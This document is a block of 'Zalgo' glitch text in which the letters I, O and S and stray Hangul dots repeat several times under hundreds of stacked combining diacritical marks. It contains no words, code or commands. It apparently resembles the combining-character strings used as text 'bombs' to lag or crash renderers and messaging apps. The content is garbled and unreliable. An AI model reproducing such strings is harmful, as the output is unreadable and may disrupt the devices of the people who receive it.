̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚̚̚̕̕͘̚̚͘͜͜͜͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̢̡̡̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͜͠͠͝͝͠͠ͅͅͅͅͅͅͅͅͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͠͝͝ͅͅͅ